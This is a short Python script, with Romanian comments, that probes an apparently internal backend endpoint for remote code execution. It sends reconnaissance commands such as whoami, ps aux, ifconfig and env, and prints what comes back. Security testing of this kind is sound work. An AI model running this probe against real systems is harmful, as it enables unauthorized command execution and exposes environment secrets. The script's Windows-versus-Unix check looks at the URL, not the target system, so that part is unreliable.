import requests

# 🔗 Endpoint-ul vulnerabil pentru execuția comenzilor
RCE_URL = "http://backend:8080/api/system/execute"

# 🛠 Lista de comenzi sigure pentru testare
COMMANDS = [
    "whoami",  # Verifică utilizatorul curent
    "hostname",  # Afișează numele sistemului
    "tasklist" if "win" in RCE_URL else "ps aux",  # Listează procesele active
    "ipconfig /all" if "win" in RCE_URL else "ifconfig",  # Afișează informații despre rețea
    "env",  # Listează variabilele de mediu
]

def test_rce():
    print("[🔍] Testare Remote Code Execution (RCE)...")

    for command in COMMANDS:
        print(f"[*] Testăm comanda: {command}")
        response = requests.post(RCE_URL, json={"command": command})

        if response.status_code == 200:
            data = response.json().get("output", "")

            if data.strip():
                print(f"[✔] Comanda executată cu succes!\n{data[:500]}...\n")
            else:
                print(f"[✖] Comanda {command} nu a returnat rezultate utile.\n")
        else:
            print(f"[❌] Cererea a eșuat ({response.status_code}) pentru comanda: {command}")

    print("[🔥] Testarea RCE s-a încheiat.")

if __name__ == "__main__":
    test_rce()
